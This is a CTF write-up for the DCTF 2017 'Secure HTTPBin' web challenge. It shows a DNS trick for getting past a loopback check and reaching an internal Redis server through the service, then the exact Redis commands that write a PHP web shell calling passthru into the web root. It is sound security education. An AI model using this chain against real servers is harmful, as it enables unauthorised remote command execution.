---
layout: post
ctf: "DCTF 2017"
title: "DCTF 2017 - Web - Secure HTTPBin"
---

    Test and debug your webserver with ease!
    Flag: https://secure-httpbin.dctf-quals-17.def.camp/flag.php
    Author: shark0der

First thing to notice is this message in the HTML source.

    <!--
    <span>We had other clients submitting their secrets and they sued us for breaching their security. We were not guilty but since we don't want this to happen again - we are not liable for any submitted secrets.</span><br>
    <span>By using this service you allow to our terms and conditions and agree that your data to be logged.</span><br>
    -->
    <!-- Note: Mark from Legal adviced to remove these ^ and temporarily stop logging until further clarification. -Tom


So some logging features was turned off but was it really turned off? Not quite. When submitting a URL to debug, you see that it used the GET parameter `?nolog`. If you submit the same request without this parameter, the application spits out errors about Redis.

    Warning: include(redis-config.php): failed to open stream: No such file or directory in /var/www/sandbox/exec.php on line 102
    Warning: include(): Failed opening 'redis-config.php' for inclusion (include_path='.:/usr/share/php') in /var/www/sandbox/exec.php on line 102
    Notice: Undefined variable: redis_host in /var/www/sandbox/exec.php on line 105
    Warning: Redis::connect(): php_network_getaddresses: getaddrinfo failed: Name or service not known in /var/www/sandbox/exec.php on line 105
    Fatal error: Uncaught RedisException: Redis server went away in /var/www/sandbox/exec.php:109 Stack trace: #0 /var/www/sandbox/exec.php(109): Redis->set('log_request_59d...', 'method=GET&url=...') #1 /var/www/sandbox/index.php(8): include('/var/www/sandbo...') #2 {main} thrown in /var/www/sandbox/exec.php on line 109

The first lines mentions that the file `redis-config.php` is not on the server. So it uses Redis and it is probably still running but the web application can't use it because it is not configured.

Going back to the main page, let's try to talk with Redis using HTTP. By doing a POST request, Redis will receive all the usual HTTP headers that is included in the request but will ignore them by saying the command does not exist. The POST body can contain actual Redis commands and Redis will hapily execute them.

<img src="https://i.imgur.com/b1cDRrQ.png">

Unfortunately, the application does not allow direct loopback access. Even if we try to pass a DNS address, it will try to resolve it to check it does not point to the loopback address.

    127.0.0.1Error: Invalid URL: IP range not allowed

At this point I assumed that the check was done using a PHP function such as `gethostbyname` and that we can probably bypass the check by using a DNS A entry with two IP addresses. This is the setup I had in Cloudflare.

<img src="https://i.imgur.com/SA8HKFu.png">

It happens that the function `gethostbyname` returns each IP with a probably of 50%.

    php > echo gethostbyname("ctf4.bcj.io");
    127.0.0.1
    php > echo gethostbyname("ctf4.bcj.io");
    1.2.3.4
    php > echo gethostbyname("ctf4.bcj.io");
    127.0.0.1
    php > echo gethostbyname("ctf4.bcj.io");
    1.2.3.4

After a couple of tries, it works! Redis answers my commands.

<img src="https://i.imgur.com/evDaACV.png">

I have then used the following commands to create a basic PHP shell on the server.

Change the current directory of Redis to the web root of the sandbox:

    CONFIG SET dir /var/www/sandbox

Set the name of the backup file that Redis uses in case of failure. The PHP extension will allow the backup file to be executed in PHP.

    CONFIG SET dbfilename becojo.php

I then insert a value in the database with the PHP code I want to execute. This string will be in plain text in the backup file.

    SET shell "<?php passthru($_GET['c']) ?>"

Finally, trigger a background save which will save the dump file into /var/www/sandox/becojo.php

    BGSAVE

The Redis server responds:

<img src="https://i.imgur.com/pEMpiDQ.png">

Everything seems fine and we have a shell and a flag.

<img src="https://i.imgur.com/UPEcccX.png">

---

Becojo - NorthernCoalition
